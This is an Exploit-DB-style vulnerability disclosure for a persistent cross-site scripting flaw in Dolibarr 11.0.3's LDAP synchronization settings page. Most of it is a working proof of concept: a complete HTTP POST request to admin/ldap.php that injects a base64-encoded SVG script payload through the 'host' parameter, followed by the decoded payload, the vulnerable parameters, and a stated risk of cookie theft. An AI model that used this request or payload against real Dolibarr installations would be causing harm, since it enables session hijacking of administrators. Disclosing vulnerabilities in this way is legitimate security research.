Title: Dolibarr 11.0.3 - Persistent Cross-Site Scripting<br>
Author: Mehmet Kelepce / Gais Cyber Security<br>
Date : 2020-04-14<br>
Vendor: https://www.dolibarr.org/<br>
Exploit-DB Author ID: 8763<br>
Remotely Exploitable: Yes<br>
Dynamic Coding Language: PHP<br>
CVSSv3 Base Score: 7.4 (AV:N, AC:L, PR:L, UI:N, S:C, C:L, I:L, A:L)<br>
Bug: XSS - Cross Site Scripting<br>
CVE:<br>
this vulnerability was found by examining the source code.<br>
<br>
PoC : Dolibarr 11.0.3 LDAP Synchronization Settings - HTTP POST REQUEST<br>
<br>
POST /dolibarr/admin/ldap.php?action=setvalue HTTP/1.1<br>
Host: localhost<br>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>
Accept-Language: en-US,en;q=0.5<br>
Accept-Encoding: gzip, deflate<br>
Referer: http://localhost/dolibarr/admin/ldap.php?action=test<br>
Content-Type: application/x-www-form-urlencoded<br>
Content-Length: 723<br>
Connection: close<br>
Cookie: DOLSESSID_08b25d38fe3d8c5d83c5477f93783b26=abml2gjafuuqcos5lm1053tqu6; DOLINSTALLNOPING_b832abc1aadf61021c84b3def6cdf1e6=0<br>
Upgrade-Insecure-Requests: 1<br><br>

token=%242y%2410%245CjT4.D4w8Qe.uaL.pHuSeDOW9PB2gnNQ7MhYrYUt7W8hq2R3oXBe&activesynchro=0&activecontact=0&type=activedirectory&LDAP_SERVER_PROTOCOLVERSION=3&host=%22%3E%3CEMBED+SRC%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoJ0hlbGxvLCBEb2xpYmFyciEnKTs8L3NjcmlwdD48L3N2Zz4%3D%22+type%3D%22image%2Fsvg%2Bxml%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E&slave=&port=389&dn=&usetls=0&admin=&pass=
<br>
Vulnerable parameters: host,slave,port<br>
Payload (base64): PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoJ0hlbGxvLCBEb2xpYmFyciEnKTs8L3NjcmlwdD48L3N2Zz4=
<br>Payload (decode) : <svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="xss"><script type="text/ecmascript">alert('Hello, Dolibarr!');</script></svg>
<br>
Parameter file: /dolibarr/admin/ldap.php<br>
<br>
Risk : cookie information of the target user is obtained.<br>
            
